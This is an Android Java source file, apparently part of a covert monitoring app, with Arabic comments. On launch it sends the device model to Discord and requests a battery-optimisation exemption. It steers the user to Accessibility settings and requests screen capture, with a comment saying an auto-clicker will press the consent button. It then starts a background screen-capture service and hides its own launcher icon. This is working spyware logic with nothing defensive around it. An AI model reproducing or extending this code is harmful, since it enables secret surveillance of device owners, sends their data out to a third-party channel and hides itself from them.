package com.tom5.monitor;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;

public class MainActivity extends Activity {
    private static final int REQ_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // تأكيد الاتصال للديسكورد
        DiscordSender.sendMessage("🔔 جهاز جديد متصل: " + android.os.Build.MODEL);

        // 1. طلب استثناء البطارية
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        } catch (Exception e) {}

        // 2. طلب إمكانية الوصول (Accessibility)
        if (!isAccessibilityEnabled()) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }

        // 3. طلب بث الشاشة (AutoClicker سيكبس الزر)
        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (mpm != null) {
            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
        }
    }

    private boolean isAccessibilityEnabled() {
        String pref = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return pref != null && pref.contains(getPackageName());
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_CODE && resultCode == RESULT_OK) {
            Intent serviceIntent = new Intent(this, ScreenService.class);
            serviceIntent.putExtra("resCode", resultCode);
            serviceIntent.putExtra("resData", data);
            startForegroundService(serviceIntent);

            // إخفاء الأيقونة
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
            finish();
        }
    }
}
